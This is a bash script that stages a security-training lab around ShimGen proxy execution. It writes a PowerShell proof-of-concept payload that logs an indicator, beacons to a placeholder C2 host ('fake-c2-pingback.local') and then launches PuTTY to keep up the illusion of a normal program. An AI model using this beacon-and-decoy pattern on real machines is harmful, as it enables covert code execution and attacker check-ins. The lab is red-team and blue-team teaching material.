#!/bin/bash

echo -e "\e[36m[*] Starting Ubuntu setup for ShimGen Lab...\e[0m"

# 1. Create directory structure
mkdir -p ~/BnB/ShimGen
cd ~/BnB/ShimGen

# 2. Download strings.exe utility for the Blue Team phase
echo -e "\e[36m[*] Downloading strings.exe (Sysinternals)...\e[0m"
wget -q https://live.sysinternals.com/strings.exe -O strings.exe

# 3. Create the PowerShell payload
echo -e "\e[36m[*] Generating payload.ps1...\e[0m"
cat << 'EOF' > payload.ps1
# --- ShimGen Lab PoC Payload ---

$LogPath = "C:\Users\Public\shimgen_poc.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Action 1: Write a log to disk (Indicator of Compromise for Blue Team)
"[$Timestamp] Payload successfully executed in memory via ShimGen proxy." | Out-File -FilePath $LogPath -Append

# Action 2: HTTP Pingback (Leaves a trace on the attacker's C2 Python server)
try {
    # Send a simple GET request that will show up in the Python web server console
    Invoke-WebRequest -Uri "http://fake-c2-pingback.local/execution_successful" -UseBasicParsing -TimeoutSec 1 -ErrorAction SilentlyContinue
} catch {}

# Action 3: Maintain the illusion (Launch the legitimate PuTTY application)
if (Test-Path "C:\Program Files\PuTTY\putty.exe") {
    Start-Process "C:\Program Files\PuTTY\putty.exe"
}
EOF

# 4. Handle the ShimGen binary
echo -e "\e[33m[!] WARNING: Due to licensing constraints, the official ShimGen binary cannot be downloaded automatically.\e[0m"
echo -e "\e[33m[!] A dummy 'shimgen.exe' file has been created. Please replace it manually with the real executable before taking the snapshot!\e[0m"
touch shimgen.exe

echo -e "\e[32m[✓] Ubuntu setup complete! Files are staged in ~/BnB/ShimGen\e[0m"
